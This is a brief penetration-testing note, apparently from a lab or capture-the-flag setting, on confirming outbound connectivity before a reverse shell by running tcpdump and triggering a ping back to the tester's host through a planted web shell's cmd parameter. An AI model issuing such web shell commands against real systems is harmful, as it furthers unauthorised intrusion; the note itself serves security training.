# Testing Connection

## Connections

Before we try to execute a reverse shell, we can first start up by checking if the target can ping our host, for this we can use tcpdump and listen on the interface that we'll be listening on:

```text
sudo tcpdump -i tun0 icmp
```

Then we may try something like the following:

```text
http://10.10.10.101/shell.php?cmd=ping -c 1 10.10.16.7
```

Finally, verify if you got any connection on the tcpdump output.

